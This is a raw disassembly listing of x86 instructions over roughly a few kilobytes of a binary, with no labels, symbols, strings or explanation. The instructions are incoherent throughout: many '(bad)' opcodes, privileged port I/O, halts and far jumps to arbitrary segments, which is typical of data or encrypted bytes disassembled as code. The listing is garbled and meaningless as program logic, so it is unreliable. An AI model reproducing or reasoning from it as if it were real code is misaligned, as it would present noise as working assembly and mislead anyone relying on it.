  4155b8:	push   0xffffffa7
  4155ba:	shl    bh,cl
  4155bc:	jo     0x415579
  4155be:	add    eax,0x39d22a6
  4155c3:	in     al,dx
  4155c4:	dec    esi
  4155c5:	cmp    eax,0xfa636c47
  4155ca:	jnp    0x415637
  4155cc:	add    bl,0xc9
  4155cf:	pop    ds
  4155d0:	fnstcw WORD PTR ds:0xed39b64c
  4155d6:	mov    gs,WORD PTR ds:0xae56d564
  4155dc:	mov    esi,0xd9257f7a
  4155e1:	cmp    ah,BYTE PTR [eax+0x716473bf]
  4155e7:	or     ebx,DWORD PTR [eax+0x67]
  4155ea:	adc    DWORD PTR [eax+0x41],edi
  4155ed:	or     cl,BYTE PTR [eax+0xa60af7c]
  4155f3:	std    
  4155f4:	fnstsw WORD PTR [ebp+edi*2+0x5b44a503]
  4155fb:	(bad)  
  4155fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155fe:	retf   0x2ec8
  415601:	lods   eax,DWORD PTR ds:[esi]
  415602:	and    ch,BYTE PTR [edx-0xc]
  415605:	pop    ebp
  415606:	jecxz  0x415682
  415608:	ja     0x415645
  41560a:	push   eax
  41560b:	add    bl,cl
  41560d:	push   ecx
  41560e:	xor    DWORD PTR [edi-0x4da69c46],esi
  415614:	in     eax,dx
  415615:	pop    esi
  415616:	call   0x227a5b54
  41561b:	mov    ch,0x7b
  41561d:	fidivr WORD PTR [esi]
  41561f:	inc    ebp
  415620:	mov    al,ds:0x6dc9c115
  415625:	lods   al,BYTE PTR ds:[esi]
  415626:	imul   esp,DWORD PTR [eax],0x4f182900
  41562c:	hlt    
  41562d:	pop    edx
  41562e:	icebp  
  41562f:	gs iret 
  415631:	dec    edx
  415632:	mov    ebx,0xe578
	...
  415693:	add    BYTE PTR [eax],al
  415695:	add    BYTE PTR [ebp-0x66],ch
  415698:	mov    esp,0xfd67ff45
  41569d:	mov    edx,0xaffd40cb
  4156a2:	cmp    eax,0x5de2b0b0
  4156a7:	fild   WORD PTR [eax]
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    BYTE PTR [edi-0x77],dl
  4156b0:	inc    ecx
  4156b1:	xchg   ebx,eax
  4156b2:	or     bl,bl
  4156b4:	iret   
  4156b5:	mov    bl,0x19
  4156b7:	mov    DWORD PTR [ebp-0x72fd73ae],edx
  4156bd:	jae    0x415734
  4156bf:	bound  ebx,QWORD PTR [ebx+edi*1]
  4156c2:	out    dx,al
  4156c3:	xchg   ebx,eax
  4156c4:	mov    ebp,0xb33a60b2
  4156c9:	lahf   
  4156ca:	std    
  4156cb:	call   0x7aaa652f
  4156d0:	not    BYTE PTR [edx+esi*2]
  4156d3:	dec    ecx
  4156d4:	mov    ds,WORD PTR ds:0x92d0b3a2
  4156da:	xor    ecx,DWORD PTR [ebx-0x3]
  4156dd:	add    al,0x32
  4156df:	lea    ecx,[ecx-0x63b646d8]
  4156e5:	sahf   
  4156e6:	and    ch,BYTE PTR [ebx]
  4156e8:	mov    al,ds:0x524ce7ee
  4156ed:	or     dl,dl
  4156ef:	xchg   DWORD PTR [ecx+0x60e6c542],ecx
  4156f5:	cmp    BYTE PTR [ebp+0x29],bh
  4156f8:	mov    ebx,0xf01cb860
  4156fd:	adc    edx,edi
  4156ff:	fldcw  WORD PTR [ebp+0x33]
  415702:	out    dx,eax
  415703:	int3   
  415704:	pop    edx
  415705:	mov    eax,ds:0xfbb72bf8
  41570a:	loope  0x4156b5
  41570c:	xrelease xchg BYTE PTR [edi],bh
  41570f:	into   
  415710:	or     ecx,DWORD PTR [edx-0x55]
  415713:	inc    edx
  415714:	jle    0x41578d
  415716:	test   BYTE PTR [esi+0x1d2b64a4],ch
  41571c:	jo     0x415707
  41571e:	jecxz  0x4156db
  415720:	jbe    0x415730
  415722:	fild   WORD PTR [ebx+0x6e6a5671]
  415728:	int    0xc8
  41572a:	cmp    edi,DWORD PTR [eax-0x2364187a]
  415730:	rcr    BYTE PTR [ebx-0x10],0x81
  415734:	adc    edi,edx
  415736:	pop    ebp
  415737:	mov    ds:0x47081b60,al
  41573c:	out    dx,al
  41573d:	out    0xf9,al
  41573f:	mov    dl,0xd6
  415741:	stos   DWORD PTR es:[edi],eax
  415742:	sub    dh,BYTE PTR [ecx+0x52b9726]
  415748:	popa   
  415749:	pop    DWORD PTR [eax-0x4c]
  41574c:	aas    
  41574d:	dec    esi
  41574e:	jecxz  0x4156f0
  415750:	mov    edi,0x6411f1df
  415755:	dec    edx
  415756:	or     ebx,DWORD PTR [esi+0x282aaeaa]
  41575c:	add    eax,esi
  41575e:	(bad)  
  41575f:	nop
  415760:	push   edx
  415761:	adc    DWORD PTR [ecx-0x7d553a46],esp
  415767:	inc    eax
  415768:	push   cs
  415769:	rcl    ah,0x37
  41576c:	xor    al,0x1a
  41576e:	enter  0x9d39,0xc3
  415772:	jg     0x41571f
  415774:	imul   dl
  415776:	dec    esi
  415777:	mov    al,ds:0x2a5d719c
  41577c:	pop    edi
  41577d:	mov    ebp,0x4480a848
  415782:	dec    edi
  415783:	fstp   DWORD PTR [eax]
  415785:	push   0xdd058775
  41578a:	push   si
  41578c:	xchg   edi,eax
  41578d:	icebp  
  41578e:	(bad)
  415791:	xor    dl,bh
  415793:	enter  0x4c66,0x40
  415797:	xchg   esi,eax
  415798:	sub    dl,BYTE PTR [edi-0x172c007b]
  41579e:	push   esp
  41579f:	and    DWORD PTR [eax-0x1f59e5fc],0xffffffb8
  4157a6:	jecxz  0x415770
  4157a8:	cmc    
  4157a9:	jmp    0xe869:0x29f7a6f5
  4157b0:	inc    edi
  4157b1:	mov    BYTE PTR [eax],ch
  4157b3:	mov    al,0xdb
	...
  415815:	add    bl,cl
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx+0x67ae69e3]
  415823:	mov    edx,0xe064be26
  415828:	add    BYTE PTR [eax],al
  41582a:	pop    es
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    BYTE PTR [ecx-0x48],al
  415830:	pop    ecx
  415831:	ins    BYTE PTR es:[edi],dx
  415832:	inc    eax
  415833:	nop
  415834:	sti    
  415835:	mov    bh,BYTE PTR [esi]
  415837:	stc    
  415838:	lods   al,BYTE PTR ds:[esi]
  415839:	sub    al,0x11
  41583b:	shl    ch,1
  41583d:	push   edi
  41583e:	add    ah,0xd2
  415841:	inc    ebp
  415842:	call   0xa65a:0x70121f86
  415849:	lods   eax,DWORD PTR ds:[esi]
  41584a:	addr16 mov eax,0x26038cd
  415850:	(bad)
  415854:	rol    BYTE PTR [edi],cl
  415856:	aad    0x5d
  415858:	fnstsw WORD PTR [edx+ecx*1]
  41585b:	fistp  WORD PTR fs:[ecx]
  41585e:	nop
  41585f:	lods   eax,DWORD PTR ds:[esi]
  415860:	pop    edi
  415861:	arpl   cx,bp
  415863:	inc    eax
  415864:	dec    ecx
  415865:	test   al,0x86
  415867:	inc    esp
  415868:	xchg   ebx,eax
  415869:	dec    esp
  41586a:	mov    ecx,0x9a760c83
  41586f:	imul   edi,DWORD PTR ds:0xe40bc7f8,0x39
  415876:	lahf   
  415877:	dec    ecx
  415878:	and    DWORD PTR [ebx+0x49],ebx
  41587b:	adc    ch,bh
  41587d:	std    
  41587e:	and    DWORD PTR [esi],edx
  415880:	lahf   
  415881:	int3   
  415882:	lods   al,BYTE PTR ds:[esi]
  415883:	(bad)
  415886:	pop    esi
  415887:	retf   0xcb7a
  41588a:	sbb    bh,dl
  41588c:	mov    al,ds:0x139dd2fd
  415892:	pop    ds
  415893:	sub    esp,DWORD PTR [ebx+0x695d6889]
  415899:	sbb    al,0xaf
  41589b:	into   
  41589c:	imul   ebx,DWORD PTR [ebx+0x28aa03c3],0x5b
  4158a3:	push   esi
  4158a4:	xor    al,0x4e
  4158a6:	cmp    DWORD PTR [ebp+0x486cfe2b],ebp
  4158ac:	dec    eax
  4158ad:	mov    bh,0x9a
  4158af:	pop    esi
  4158b0:	cwde   
  4158b1:	jecxz  0x41584d
  4158b3:	scas   eax,DWORD PTR es:[edi]
  4158b4:	push   ebx
  4158b5:	cmc    
  4158b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158b7:	repz sar DWORD PTR [ebp-0x67],1
  4158bb:	lea    ecx,[ebx+0x3334597b]
  4158c1:	xchg   esp,eax
  4158c2:	idiv   BYTE PTR [ecx-0x3998817e]
  4158c8:	pop    esp
  4158c9:	xchg   DWORD PTR ds:0x12181f87,esi
  4158cf:	gs je  0x415934
  4158d2:	int    0x4b
  4158d4:	inc    ebp
  4158d5:	loope  0x415950
  4158d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d8:	in     eax,0x81
  4158da:	jb     0x4158e9
  4158dc:	dec    ebx
  4158dd:	loop   0x4158e2
  4158df:	push   esi
  4158e0:	cmp    cl,BYTE PTR [edi+0x69]
  4158e3:	clc    
  4158e4:	(bad)  
  4158e5:	adc    ah,dl
  4158e7:	scas   al,BYTE PTR es:[edi]
  4158e8:	ins    DWORD PTR es:[edi],dx
  4158e9:	mov    ebp,edx
  4158eb:	sbb    DWORD PTR [ebx+ecx*2],ebx
  4158ee:	cs stc 
  4158f0:	jmp    0xaccefc22
  4158f5:	std    
  4158f6:	and    eax,0x6014d492
  4158fb:	mov    WORD PTR [ecx],fs
  4158fd:	mov    al,ds:0x5dc50d23
  415902:	in     eax,0x99
  415904:	xchg   DWORD PTR [edi+0xc3e9d20],ebp
  41590a:	cmp    BYTE PTR [ebx+0x27],cl
  41590d:	sbb    eax,0x46930563
  415912:	imul   esp,DWORD PTR [eax],0x2acff0b6
  415918:	or     al,0x5
  41591a:	jbe    0x415999
  41591c:	push   ebx
  41591d:	je     0x415957
  41591f:	fmul   DWORD PTR [esi+0x7805eda8]
  415925:	dec    ebx
  415926:	mov    ebx,0x4ff64b14
  41592b:	hlt    
  41592c:	push   ebp
  41592d:	daa    
  41592e:	test   al,0x33
  415930:	xchg   ebx,eax
  415931:	jmp    0xe9629d
	...
  415996:	inc    ebp
  415997:	mov    BYTE PTR [edi+esi*2],ch
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0xc1
  4159a3:	ja     0x4159e5
  4159a5:	dec    eax
  4159a6:	imul   esp,ecx,0x0
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [ebx],al
  4159af:	pop    esp
  4159b0:	adc    BYTE PTR [ecx],al
  4159b2:	jbe    0x415961
  4159b4:	mov    edx,0x7f2577bb
  4159b9:	clc    
  4159ba:	arpl   cx,cx
  4159bc:	cli    
  4159bd:	mov    esp,0x10b16a81
  4159c2:	xchg   edi,eax
  4159c3:	dec    eax
  4159c4:	leave  
  4159c5:	jl     0x4159e5
  4159c7:	dec    ecx
  4159c8:	mov    ch,0xf
  4159ca:	sbb    eax,DWORD PTR [eax]
  4159cc:	and    ebx,DWORD PTR [ebp+0x44]
  4159cf:	sub    bh,0xe2
  4159d2:	fs inc esi
  4159d4:	mov    bl,0xdf
  4159d6:	inc    esp
  4159d7:	imul   edx,DWORD PTR [edx],0xffffffbc
  4159da:	sbb    esi,edx
  4159dc:	mov    WORD PTR [ecx+ebx*2-0xa],gs
  4159e0:	mov    dh,BYTE PTR [edx]
  4159e2:	or     al,0x50
  4159e4:	fwait
  4159e5:	repnz neg edi
  4159e8:	cmp    al,0xd9
  4159ea:	xor    al,0xee
  4159ec:	push   ds
  4159ed:	or     ebx,DWORD PTR [ecx]
  4159ef:	repz lahf 
  4159f1:	push   eax
  4159f2:	and    ah,BYTE PTR [ebx-0x398826e6]
  4159f8:	mov    cx,0x5982
  4159fc:	iret   
  4159fd:	stos   BYTE PTR es:[edi],al
  4159fe:	fnstcw WORD PTR [eax-0x5e]
  415a01:	or     eax,0x163264b8
  415a06:	dec    edx
  415a07:	or     ebp,DWORD PTR ds:0x6f82d80e
  415a0d:	and    dl,BYTE PTR ds:0x8600d743
  415a13:	retf   
  415a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a15:	in     eax,dx
  415a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a17:	cmp    eax,0x3da021cf
  415a1c:	or     esp,DWORD PTR [ebp+ecx*1-0x25f96016]
  415a23:	pop    ds
  415a24:	rcr    BYTE PTR [ecx+0x2497c546],1
  415a2a:	pop    ss
  415a2b:	or     BYTE PTR [edx-0xd3ebec2],dh
  415a31:	sbb    al,BYTE PTR [esi+ebp*4]
  415a34:	(bad)  [ebx]
  415a36:	out    dx,eax
  415a37:	inc    esp
  415a38:	outs   dx,BYTE PTR ds:[esi]
  415a39:	mov    ebx,DWORD PTR [edx+0x28]
  415a3c:	pop    ecx
  415a3d:	cwde   
  415a3e:	adc    al,0x2
  415a40:	mov    edx,0x1d252289
  415a45:	dec    ebp
  415a46:	pop    ebx
  415a47:	xor    dl,cl
  415a49:	out    0x74,al
  415a4b:	imul   eax,ebx,0x102843af
  415a51:	int3   
  415a52:	add    dh,BYTE PTR [eax-0x78]
  415a55:	lahf   
  415a56:	mov    dl,0xe5
  415a58:	loope  0x415a3c
  415a5a:	shl    DWORD PTR [ecx],cl
  415a5c:	add    edx,DWORD PTR [ebx]
  415a5e:	stc    
  415a5f:	and    ax,0xd16e
  415a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a64:	adc    eax,0x5258b90f
  415a69:	out    0x3f,eax
  415a6b:	pop    ds
  415a6c:	fimul  DWORD PTR [esi+0x77dd9152]
  415a72:	pop    ecx
  415a73:	shl    DWORD PTR [ecx+0x694c7666],0xdb
  415a7a:	mov    cl,0xb9
  415a7c:	fidiv  WORD PTR [eax-0x6cc17600]
  415a82:	jecxz  0x415ab1
  415a84:	call   0xe6dc:0x73094bf6
  415a8b:	sbb    ah,BYTE PTR [ebx]
  415a8d:	(bad)  
  415a8e:	cmp    al,0xce
  415a90:	sub    ebx,esi
  415a92:	test   eax,0x9b6141b8
  415a97:	loop   0x415a89
  415a99:	jecxz  0x415a58
  415a9b:	daa    
  415a9c:	mov    bl,0x55
  415a9e:	fwait
  415a9f:	ja     0x415a25
  415aa1:	cmp    BYTE PTR [esi-0x60f7b1fd],ah
  415aa7:	jne    0x415a9d
  415aa9:	ds add esp,ebp
  415aac:	stos   BYTE PTR es:[edi],al
  415aad:	inc    esp
  415aae:	pushf  
  415aaf:	sub    eax,0x304b69d2
  415ab4:	fadd   QWORD PTR [eax]
	...
  415b16:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0x4c8b33df
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [edx+0x17],cl
  415b30:	retf   
  415b31:	mov    ecx,0x6e16e840
  415b36:	push   0xc3cb33f4
  415b3b:	mov    bl,dl
  415b3d:	ss cld 
  415b3f:	adc    ebx,ebx
  415b41:	pop    esp
  415b42:	loopne 0x415af0
  415b44:	sub    bh,0xd7
  415b47:	or     BYTE PTR [edx+esi*4],0xf8
  415b4b:	lods   al,BYTE PTR ds:[esi]
  415b4c:	push   esp
  415b4d:	or     DWORD PTR [edi-0x25],ecx
  415b50:	jns    0x415bc2
  415b52:	(bad)  
  415b53:	fisttp WORD PTR [esi+edi*2]
  415b56:	imul   ebp,edi,0xa6c97bd5
  415b5c:	dec    ebx
  415b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b5e:	pusha  
  415b5f:	lods   al,BYTE PTR ds:[esi]
  415b60:	ins    BYTE PTR es:[edi],dx
  415b61:	clc    
  415b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b63:	xor    eax,0xaebab0a0
  415b68:	push   ds
  415b69:	imul   ebx,DWORD PTR [ecx-0x9165202],0xe29f50bb
  415b73:	pop    edi
  415b74:	inc    ecx
  415b75:	shr    BYTE PTR [edi+0x35],1
  415b78:	xchg   ecx,eax
  415b79:	popa   
  415b7a:	push   esi
  415b7b:	xchg   esp,eax
  415b7c:	push   ds
  415b7d:	ja     0x415bcd
  415b7f:	mov    esp,0xc8b7314e
  415b84:	xchg   ecx,eax
  415b85:	pop    eax
  415b86:	and    DWORD PTR [ebx],ecx
  415b88:	retf   
  415b89:	loopne 0x415b10
  415b8b:	xor    al,0x49
  415b8d:	enter  0x2ebd,0xb5
  415b91:	xchg   esi,eax
  415b92:	xchg   esp,eax
  415b93:	mov    eax,ds:0xfaf56a8e
  415b98:	mov    cl,0xf9
  415b9a:	loope  0x415c1a
  415b9c:	int3   
  415b9d:	mov    ah,0xb8
  415b9f:	lods   eax,DWORD PTR ds:[esi]
  415ba0:	inc    edx
  415ba1:	daa    
  415ba2:	cdq    
  415ba3:	ds cmp al,0xbc
  415ba6:	push   es
  415ba7:	push   ss
  415ba8:	mov    bh,0xba
  415baa:	ficomp DWORD PTR [edi-0x58ed0aad]
  415bb0:	call   0x8561:0x4809ce37
  415bb7:	leave  
  415bb8:	or     BYTE PTR [esi],bl
  415bba:	lea    eax,[ebp+0x60]
  415bbd:	push   esp
  415bbe:	jne    0x415b7c
  415bc0:	in     eax,0xac
  415bc2:	(bad)  
  415bc3:	popa   
  415bc4:	imul   esp,DWORD PTR [si-0x68fa],0xe03a126b
  415bcd:	jbe    0x415c21
  415bcf:	jnp    0x415bf3
  415bd1:	ss loopne 0x415be7
  415bd4:	pushf  
  415bd5:	push   0x17
  415bd7:	lods   eax,DWORD PTR ds:[esi]
  415bd8:	aas    
  415bd9:	cwde   
  415bda:	pop    eax
  415bdb:	ror    DWORD PTR [eax-0x750ab8ad],1
  415be1:	and    eax,0xb374f0f7
  415be6:	mov    ebx,0x1fcc321e
  415beb:	(bad)  
  415bec:	push   ebp
  415bed:	inc    ebp
  415bee:	push   ebx
  415bef:	mov    edx,DWORD PTR [esi-0x63]
  415bf2:	cdq    
  415bf3:	shr    DWORD PTR [ebx],0x54
  415bf6:	ror    ah,1
  415bf8:	adc    BYTE PTR [edx-0x70],bh
  415bfb:	xchg   esi,eax
  415bfc:	cs adc al,0xbb
  415bff:	fild   QWORD PTR [ecx+0x7304777f]
  415c05:	mov    ecx,0xa6d48393
  415c0a:	dec    ebx
  415c0b:	cwde   
  415c0c:	(bad)  
  415c0d:	lods   eax,DWORD PTR ds:[esi]
  415c0e:	push   ss
  415c0f:	xchg   edx,eax
  415c10:	jbe    0x415bb9
  415c12:	test   BYTE PTR [eax+0x4cc4d55c],cl
  415c18:	aaa    
  415c19:	stos   BYTE PTR es:[edi],al
  415c1a:	pop    ebx
  415c1b:	add    edi,DWORD PTR [eax+0x7d]
  415c1e:	dec    ecx
  415c1f:	and    DWORD PTR [ecx-0x24ef8b4d],esi
  415c25:	outs   dx,BYTE PTR ds:[esi]
  415c26:	mov    edx,DWORD PTR [ecx-0x32]
  415c29:	push   ebx
  415c2a:	add    esp,edx
  415c2c:	nop
  415c2d:	xchg   eax,edi
  415c2f:	mov    al,ds:0x56e0f932
  415c34:	add    eax,0x0
	...
  415c95:	add    BYTE PTR [edx],bh
  415c97:	adc    BYTE PTR [edi-0x444040c4],bh
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0x35b6e20f
  415ca5:	(bad)  
  415ca6:	jns    0x415c8b
  415ca8:	add    BYTE PTR [eax],al
  415caa:	pop    es
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    BYTE PTR [ecx-0xbe6f5c9],al
  415cb3:	hlt    
  415cb4:	inc    edi
  415cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cb6:	les    eax,FWORD PTR [edx+0x7f]
  415cb9:	int    0xe7
  415cbb:	add    esp,DWORD PTR [ebx-0xec7f7a7]
  415cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc2:	sbb    bl,al
  415cc4:	iret   
  415cc5:	cmp    bh,BYTE PTR [ebx]
  415cc7:	mov    edi,0x63fc33cc
  415ccc:	loopne 0x415c89
  415cce:	dec    esi
  415ccf:	cmp    dl,al
  415cd1:	inc    ecx
  415cd2:	mov    al,0x8
  415cd4:	outs   dx,DWORD PTR ds:[esi]
  415cd5:	and    eax,0xc0604419
  415cda:	ss retf 
  415cdc:	pop    ds
  415cdd:	fiadd  WORD PTR [ecx-0x1649fd78]
  415ce3:	retf   
  415ce4:	xchg   ecx,esi
  415ce6:	in     eax,0x9d
  415ce8:	fistp  WORD PTR [edx+0x4bdcc2af]
  415cee:	adc    BYTE PTR [ebx-0x42549d32],cl
  415cf4:	mov    dh,BYTE PTR [edx-0x3e]
  415cf7:	and    BYTE PTR [ecx],0xb5
  415cfa:	pop    ebx
  415cfb:	fnstenv [eax-0x6c]
  415cfe:	mov    ds:0x6bc8dd63,eax
  415d03:	enter  0x8b6c,0x25
  415d07:	xchg   ebx,eax
  415d08:	into   
  415d09:	aas    
  415d0a:	(bad)  
  415d0b:	xchg   ecx,eax
  415d0c:	int    0x93
  415d0e:	push   ebp
  415d0f:	jmp    0x8337b8e1
  415d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d15:	ret    0x79e5
  415d18:	mov    DWORD PTR ds:0xe11c63f3,edi
  415d1e:	jbe    0x415ce5
  415d20:	and    al,0xee
  415d22:	mov    edx,eax
  415d24:	dec    esp
  415d25:	pop    esp
  415d26:	inc    eax
  415d27:	mov    ebp,0xb886fc6a
  415d2c:	adc    ebx,DWORD PTR [ebp-0x6]
  415d2f:	mov    al,0xab
  415d31:	out    0x19,al
  415d33:	scas   al,BYTE PTR es:[edi]
  415d34:	mov    DWORD PTR [edx],edi
  415d36:	test   al,0xc6
  415d38:	dec    ebp
  415d39:	pop    ecx
  415d3a:	sbb    bl,dl
  415d3c:	out    0x69,eax
  415d3e:	jmp    0x415d5a
  415d40:	fwait
  415d41:	mov    BYTE PTR [ebp+0xc0f9edd],cl
  415d47:	push   ds
  415d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d49:	mov    ecx,DWORD PTR [edx+eiz*4+0x79]
  415d4d:	in     eax,dx
  415d4e:	enter  0xfb18,0xff
  415d52:	popa   
  415d53:	xchg   ecx,eax
  415d54:	jmp    0x415cfc
  415d56:	pop    ss
  415d57:	std    
  415d58:	pxor   mm7,QWORD PTR ds:0xbd70e8c
  415d5f:	mov    ds:0xcfcef00b,eax
  415d64:	push   ebp
  415d65:	std    
  415d66:	sbb    ebx,DWORD PTR [ecx+0x1da413b2]
  415d6c:	ja     0x415d0a
  415d6e:	pop    esp
  415d6f:	mov    BYTE PTR [edi],0xaa
  415d72:	mov    bh,0x25
  415d74:	add    al,0x65
  415d76:	or     eax,0x2be378ce
  415d7b:	and    DWORD PTR [ecx-0x14],edi
  415d7e:	inc    ecx
  415d7f:	xor    BYTE PTR [edi-0x7d],0x26
  415d83:	jae    0x415def
  415d85:	sub    BYTE PTR [eax],al
  415d87:	(bad)  
  415d89:	out    0x58,al
  415d8b:	xor    al,0x5c
  415d8d:	ins    DWORD PTR es:[edi],dx
  415d8e:	scas   eax,DWORD PTR es:[edi]
  415d8f:	mov    ?,WORD PTR [ecx-0x77ca708f]
  415d95:	(bad)  
  415d96:	les    ebp,FWORD PTR [edi-0x631cee44]
  415d9c:	enter  0x7d76,0x98
  415da0:	xor    esi,ebp
  415da2:	pop    esi
  415da3:	push   0xda272b0f
  415da8:	mov    DWORD PTR [edi+esi*4],ecx
  415dab:	sbb    DWORD PTR fs:[ebx+0x64],edi
  415daf:	jne    0x415d63
  415db1:	ds pop ds
  415db3:	hlt    
  415db4:	mov    dl,0x0
	...
  415e16:	out    dx,al
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0x1ec85606
  415e24:	cdq    
  415e25:	loope  0x415da7
  415e27:	in     al,0x0
  415e29:	add    BYTE PTR [edi],al
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    BYTE PTR [esi+0x3d],cl
  415e30:	xor    ebx,0xfffffff3
  415e33:	inc    esp
  415e34:	sahf   
  415e35:	or     BYTE PTR [edx],dl
  415e37:	inc    eax
  415e38:	dec    edx
  415e39:	sub    DWORD PTR [edi-0x39a480ab],esp
  415e3f:	popf   
  415e40:	cmp    eax,0x49c5641b
  415e45:	fsub   DWORD PTR [esp+eiz*2]
  415e48:	jge    0x415dec
  415e4a:	mov    ch,0xc6
  415e4c:	std    
  415e4d:	add    DWORD PTR [ecx+0x67a90dd0],0x31
  415e54:	not    al
  415e56:	pop    ecx
  415e57:	jbe    0x415e59
  415e59:	outs   dx,BYTE PTR ds:[esi]
  415e5a:	loop   0x415eba
  415e5c:	nop
  415e5d:	dec    ebp
  415e5e:	push   ebx
  415e5f:	mov    al,bl
  415e61:	cdq    
  415e62:	cdq    
  415e63:	mov    BYTE PTR [ebp+ebx*8+0x3f],dh
  415e67:	dec    ebp
  415e68:	cmp    eax,0x89f27762
  415e6d:	lea    edx,[esi]
  415e6f:	adc    al,0x14
  415e71:	data16 sahf 
  415e73:	adc    eax,0x8b7ff457
  415e78:	pop    ecx
  415e79:	mov    cl,0xa4
  415e7b:	iret   
  415e7c:	ins    BYTE PTR es:[edi],dx
  415e7d:	add    al,0x49
  415e7f:	out    dx,al
  415e80:	add    al,0x88
  415e82:	loope  0x415e9f
  415e84:	mul    DWORD PTR [eax]
  415e86:	jge    0x415e59
  415e88:	or     eax,0xd09fa175
  415e8d:	mov    ds:0xb478a159,eax
  415e92:	dec    esp
  415e93:	rcr    BYTE PTR [esp+ebp*8],0xa0
  415e97:	adc    ch,ah
  415e99:	pop    ebp
  415e9a:	stc    
  415e9b:	hlt    
  415e9c:	in     eax,0x14
  415e9e:	pop    ebp
  415e9f:	push   edi
  415ea0:	lods   eax,DWORD PTR ds:[esi]
  415ea1:	cld    
  415ea2:	inc    eax
  415ea3:	call   0x68bb:0x6747f6c9
  415eaa:	cwde   
  415eab:	lods   al,BYTE PTR ds:[esi]
  415eac:	arpl   WORD PTR [ebx],ax
  415eae:	nop
  415eaf:	inc    esp
  415eb0:	xlat   BYTE PTR ds:[ebx]
  415eb1:	sbb    ebx,DWORD PTR [edx]
  415eb3:	fadd   st,st(6)
  415eb5:	cmc    
  415eb6:	inc    esp
  415eb7:	cmc    
  415eb8:	cmc    
  415eb9:	(bad)  
  415eba:	loopne 0x415eb5
  415ebc:	stos   BYTE PTR es:[edi],al
  415ebd:	fstp   QWORD PTR [edi+0x4a]
  415ec0:	inc    esi
  415ec1:	add    cl,BYTE PTR [esi-0x423cf9e2]
  415ec7:	stos   BYTE PTR es:[edi],al
  415ec8:	loope  0x415f48
  415eca:	fs pop ss
  415ecc:	and    ebx,DWORD PTR [ebx-0x56]
  415ecf:	pushf  
  415ed0:	push   eax
  415ed1:	test   DWORD PTR [esp+ebp*2+0x4b],0xaf8f5864
  415ed9:	jmp    FWORD PTR [esi+0x7249cd5a]
  415edf:	lds    esi,FWORD PTR [edi+0x63e99015]
  415ee5:	unpcklps xmm0,XMMWORD PTR [esi+0x70f93a7]
  415eec:	mov    ds:0x90d615e3,eax
  415ef1:	inc    esp
  415ef2:	cdq    
  415ef3:	mov    eax,ds:0x2fc77cc2
  415ef8:	popa   
  415ef9:	and    bh,BYTE PTR [edx+0xa]
  415efc:	mov    cl,BYTE PTR [edi+esi*8+0x7ca7da2b]
  415f03:	xor    BYTE PTR [esi+0x4c0f5c05],dh
  415f09:	sahf   
  415f0a:	outs   dx,DWORD PTR ds:[esi]
  415f0b:	cs or  al,al
  415f0e:	or     edx,eax
  415f10:	lock test al,bh
  415f13:	pop    es
  415f14:	cmc    
  415f15:	or     eax,0xc7b59e84
  415f1a:	push   ds
  415f1b:	dec    esi
  415f1c:	xchg   BYTE PTR [ecx*4+0x1ee3b79a],dl
  415f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f24:	pushf  
  415f25:	and    eax,eax
  415f27:	add    al,0x7d
  415f29:	fsubr  DWORD PTR [ebp+0x7c]
  415f2c:	cs loop 0x415fa7
  415f2f:	cwde   
  415f30:	dec    esi
  415f31:	and    edx,eax
  415f33:	mov    ebx,0xd3
	...
  415f94:	add    BYTE PTR [eax],al
  415f96:	pop    ss
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	popf   
  415fa3:	mov    ch,0x4d
  415fa5:	ds xchg ebp,esp
  415fa8:	add    BYTE PTR [eax],al
  415faa:	pop    es
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    cl,cl
  415faf:	(bad)  
  415fb0:	push   ss
  415fb1:	cmp    cl,dl
  415fb3:	pop    es
  415fb4:	push   ebx
  415fb5:	lock dec esp
  415fb7:	in     eax,0x3b
  415fb9:	cli    
  415fba:	or     DWORD PTR [edi-0xc],0xffffffab
  415fbe:	pushf  
  415fbf:	adc    ch,bl
  415fc1:	loope  0x41600e
  415fc3:	xor    edi,edi
  415fc5:	mov    dh,0x41
  415fc7:	jno    0x415fa7
  415fc9:	idiv   ebp
  415fcb:	xchg   edx,eax
  415fcc:	pushf  
  415fcd:	aaa    
  415fce:	sahf   
  415fcf:	sub    BYTE PTR [edx],bh
  415fd1:	sbb    BYTE PTR [eax+0x3a93537d],bh
  415fd7:	pusha  
